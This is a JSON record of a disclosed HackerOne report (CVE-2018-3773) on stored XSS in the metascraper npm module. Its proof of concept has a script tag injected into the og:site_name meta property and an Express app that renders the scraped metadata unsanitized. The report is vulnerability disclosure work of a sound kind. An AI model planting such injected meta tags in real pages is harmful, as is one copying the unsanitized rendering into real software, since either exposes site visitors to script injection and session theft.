@@ -1,0 +1,151 @@
+{
+  "id": 309367,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDkzNjc=",
+  "url": "https://hackerone.com/reports/309367",
+  "title": "[metascraper] Stored XSS in Open Graph meta properties read by metascrapper",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-01-25T21:27:01.580Z",
+  "submitted_at": "2018-01-25T21:27:01.580Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bl4de",
+    "url": "/bl4de",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2018-3773"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-03-28T06:09:21.146Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-03-28T06:09:07.258Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi Guys,\n\n**metascrapper** is vulnerable to Stored XSS via Open Graph metadata, if they are used in HTML without any sanitization.\n\n**Module:** \n\nA library to easily scrape metadata from an article on the web using Open Graph metadata, regular HTML metadata, and series of fallbacks.\n\nhttps://www.npmjs.com/package/metascraper\n\n\n**Description**\n\nDue to lack of HTML sanitization, there is possibility to embed malicious code in any of metadata read by ```metascrapper```. When library reads such metadata, there is no sanitization performed. If output from ```metascrapper``` is used directly in HTML code, any HTML embed in metadata is executed in context of the page which load and render it.\n\n\n## Steps To Reproduce:\n\n### This part of PoC represents An Attacker\n\nAn attacker needs to inject malicious code into any of Open Graph property.\n\n- create website (I serve it via static server available at http://127.0.0.1:8080) witt the following content. Please take a look at payload embed in ```og:site_name``` meta property:\n\n```html\n<!doctype html>\n<html xmlns:og=\"http://ogp.me/ns#\" lang=\"en\">\n\n<head>\n    <meta charset=\"utf8\">\n    <title>metascraper</title>\n\n    <meta property=\"og:description\" content=\"The HR startups go to war.\">\n    <meta property=\"og:image\" content=\"image\">\n    <meta property=\"og:site_name\" content='<script src=\"http://127.0.0.1:8080/malware.js\"></script>'>\n    <meta property=\"og:title\" content=\"test article\">\n    <meta property=\"og:type\" content=\"article\">\n    <meta property=\"og:url\" content=\"http://127.0.0.1:8080\">\n</head>\n\n<body>\n</body>\n</html>\n```\n\n- save it as ```article.html``` in the root directory of the server runs on ```http://127.0.0.1:8080```.\n\n- create ```malware.js``` file with following content and save it in the same directory as ```article.html```:\n\n```\nalert('Uh oh, I am very bad malware!')\n```\n\nPlease be aware that ```JavaScript``` file with malicious code can be served from ANY place. This particular location is only for Poc.\n\n\n**This represents an HTML page which can be \"scrapped\" with ```metascrapper```**\n\n\n### This part of PoC represents legitimate User and an attack itself\n\n- install ```metascrapper``` and required dependiences (```got``` and ```express```)\n\n```\n$ npm install metascrapper got express\n```\n\n- create an app which will use ```metascrapper``` to read webiste metadata. ```127.0.0.1:8888``` is address of server which uses ```metascrapper```. ```http://127.0.0.1:8080/article.html``` is **target website**, where from metadata will be read:\n\n```javascript\n\nconst metascraper = require('metascraper')\nconst got = require('got')\nconst express = require('express')\n\nconst targetUrl = 'http://127.0.0.1:8080/article.html'\n\nconst app = express()\n\napp.get('/scrap', function(req, res) {;\n    (async() => {\n        const {\n            body: html,\n            url\n        } = await got(targetUrl)\n        const metadata = await metascraper({\n            html,\n            url\n        })\n        console.log(metadata)  // see returned metadata in console:\n        /*\n            { author: null,\n                date: null,\n                description: 'The HR startups go to war.',\n                image: 'http://127.0.0.1:8080/image',\n                lang: 'en',\n                logo: null,\n                publisher: '<script src=\"http://127.0.0.1:8080/malware.js\"></script>',\n                title: 'test article',\n                url: 'http://127.0.0.1:8080/article.html' }\n        */\n        // display content of metadata.publisher in the browser\n        let __html = `\n            <div>\n                <p>site title: ${metadata.title}</p>\n                <p>site publisher: ${metadata.publisher}</p>\n            </div>\n        `\n        res.send(__html)\n    })()\n})\n\napp.listen(8888, () => console.log('Example app listening on port 8888!'))\n```\n\n- run above app:\n\n```\n$ node app.js\n```\n\n- go to ```http://127.0.0.1:8888/scrap```\n\n- malicious JavaScript code embed in site metadata ```og:site_name``` is executed:\n\n{F257373}\n\nAs we can notice, our payload was displayed in the source page \"as is\":\n\n{F257372}\n\n\n## Supporting Material/References:\n\nConfiguration I've used to find this vulnerability:\n\n- macOS HighSierra 10.13.3\n- node 8.9.3\n- npm 5.5.1\n- curl 7.54.0\n\n## Wrap up\n\nI hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.\n\nThank you\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nAlthough this is quite hard to exploit in the wild, there is no doubt such attack is possible. This might lead to malware distribution, session cookies from infected websites leaks, run cryptocurrency miners in users' browsers and many more attacks.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 257372,
+      "file_name": "2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/257/372/4c3e3add8dc7ad76e29e61191240a119fc0d3e17/2.png?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYFDQO7IY%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152435Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQD9OuD2ePEEIgnHwsQC%2BdTj6of5uKbT0MhIw%2FeL0CQ9OAIhAL%2F0S34DzIRuokDr1Cp3lIRnQomOJ7NeNsLYjO8W5Ky8KroFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzn%2Fwf3jc46KizF8nIqjgVkN18oXrqCmUpsTfiHBN6Zq8qBnJ%2FHXUh1Jiz18gYqHKQ%2BytXut%2FivLkXB6HyG%2BLT7cvdxT2J%2FZL%2FkOMJZTV%2BIjA3LzxQJX1U8PJ9APZpwHUddAcuek6gpwhiRm4VvHewD1zmZPY5qW3mSVO5hqB%2FOoNeUR9rmFbKB12MESLW7TsPoWfuFnwAi%2FXq%2B%2FhFamJRaluaHY9jNrey6WVh1%2B7RdgJvIbcyldkvCo0xK%2FUVs4BKpWORCV3g3FKCl2fvtjvvBzytgUrhv9wl9cm57oer6FyvFiAsaFjki8BTjx0MR1IVYIv9NSEFAYMYiysYR3VgVXXC8bljnPy3zxPdq29TBaujb1FBXA02Fda9KDjV47hcNZku6OT6KybroorlYxIJIGcgdPJ20iTxMqrrTyzDZp1I%2BSQ001Pb%2FOnI4Af3fBvCHJn%2Fs%2BGZqBhU6f2Byxnqesie1K65EZupZhKM%2FDZRRS9MtCehPHgYJbYELv7TZEyrr42%2BYahIJTXyU%2BFwGLZEqBFu3MGXnmFKFbiytZxedGzOW%2BDoApEvTFZZg4DIyw8RNsYumWXjN8MzpUM7JPbw28RcpQk3QKT9efTCDZZyh7MdZUPCxs8LNrKhUZSzauXTNWHASZPhDrd1ddf3FmLHIy3Gb0BloYcNyQzcczDgmJ3jl2jj%2F4rOfmtRj%2BrBO6n5EedMg%2BuS53msuhiZS3uokjkiHxKaPaSduAcbnmRQLvxKpTessH8dmaj5ve5452Jwu9o3xqaAw6JztbzxGuNNj%2BSU%2BwMUuClfMIw6fO6X4ZgUCsw88Fgq08zVkVSdby2Bm9rrGknPf8pG%2BUqv94ogtpnBkJUZPKTDb%2BhRgZPNLLWSkZntuFG054fhM5fswsoL9zwY6sAHMiLi%2BI5TiNiMkK5mPGuQwWpANEl30vZQrNdy2q2t7y9MPJyCegLhytHyz3vwTBjjY0uHX9pKRudyjVdSHxR%2BjLF2sxiOWXjvhDSgnRKnsQ4i2DqP7ydqJ6n8L7do0cmdkQJJKOABtVE%2F3twRnrUCq6tdQ%2BsBaTwm%2BHeoggT8j5Q4xgV%2FlCP%2Bif0xdv4M%2FZvx%2B7%2F2EbJc6JW0YE%2F1taMKbD4n646%2BF9r1hWNCcUjyKxQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=68c88d8b63f35d309002b6bc4dffe3b702a993ecf253332086d99c82bce8f286",
+      "file_size": 200754,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 257373,
+      "file_name": "1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/257/373/68abc754876fe37cb8382a989ccf6199a46d5a30/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYFDQO7IY%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152435Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQD9OuD2ePEEIgnHwsQC%2BdTj6of5uKbT0MhIw%2FeL0CQ9OAIhAL%2F0S34DzIRuokDr1Cp3lIRnQomOJ7NeNsLYjO8W5Ky8KroFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzn%2Fwf3jc46KizF8nIqjgVkN18oXrqCmUpsTfiHBN6Zq8qBnJ%2FHXUh1Jiz18gYqHKQ%2BytXut%2FivLkXB6HyG%2BLT7cvdxT2J%2FZL%2FkOMJZTV%2BIjA3LzxQJX1U8PJ9APZpwHUddAcuek6gpwhiRm4VvHewD1zmZPY5qW3mSVO5hqB%2FOoNeUR9rmFbKB12MESLW7TsPoWfuFnwAi%2FXq%2B%2FhFamJRaluaHY9jNrey6WVh1%2B7RdgJvIbcyldkvCo0xK%2FUVs4BKpWORCV3g3FKCl2fvtjvvBzytgUrhv9wl9cm57oer6FyvFiAsaFjki8BTjx0MR1IVYIv9NSEFAYMYiysYR3VgVXXC8bljnPy3zxPdq29TBaujb1FBXA02Fda9KDjV47hcNZku6OT6KybroorlYxIJIGcgdPJ20iTxMqrrTyzDZp1I%2BSQ001Pb%2FOnI4Af3fBvCHJn%2Fs%2BGZqBhU6f2Byxnqesie1K65EZupZhKM%2FDZRRS9MtCehPHgYJbYELv7TZEyrr42%2BYahIJTXyU%2BFwGLZEqBFu3MGXnmFKFbiytZxedGzOW%2BDoApEvTFZZg4DIyw8RNsYumWXjN8MzpUM7JPbw28RcpQk3QKT9efTCDZZyh7MdZUPCxs8LNrKhUZSzauXTNWHASZPhDrd1ddf3FmLHIy3Gb0BloYcNyQzcczDgmJ3jl2jj%2F4rOfmtRj%2BrBO6n5EedMg%2BuS53msuhiZS3uokjkiHxKaPaSduAcbnmRQLvxKpTessH8dmaj5ve5452Jwu9o3xqaAw6JztbzxGuNNj%2BSU%2BwMUuClfMIw6fO6X4ZgUCsw88Fgq08zVkVSdby2Bm9rrGknPf8pG%2BUqv94ogtpnBkJUZPKTDb%2BhRgZPNLLWSkZntuFG054fhM5fswsoL9zwY6sAHMiLi%2BI5TiNiMkK5mPGuQwWpANEl30vZQrNdy2q2t7y9MPJyCegLhytHyz3vwTBjjY0uHX9pKRudyjVdSHxR%2BjLF2sxiOWXjvhDSgnRKnsQ4i2DqP7ydqJ6n8L7do0cmdkQJJKOABtVE%2F3twRnrUCq6tdQ%2BsBaTwm%2BHeoggT8j5Q4xgV%2FlCP%2Bif0xdv4M%2FZvx%2B7%2F2EbJc6JW0YE%2F1taMKbD4n646%2BF9r1hWNCcUjyKxQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=dc409caf24b2607163db8e51f15cf37498e9eca30b6c72d85c75d3dd23159aa0",
+      "file_size": 374279,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-04-27T06:09:07.362Z",
+  "allow_singular_disclosure_after": -253530928.17540097,
+  "singular_disclosure_allowed": true,
+  "vote_count": 7,
+  "voters": [
+    "base_64",
+    "muon4",
+    "johndoe1492",
+    "apapedulimu",
+    "akaash_pantherdefence",
+    "eveeez",
+    "khalooda0x"
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 7932,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "metascraper",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
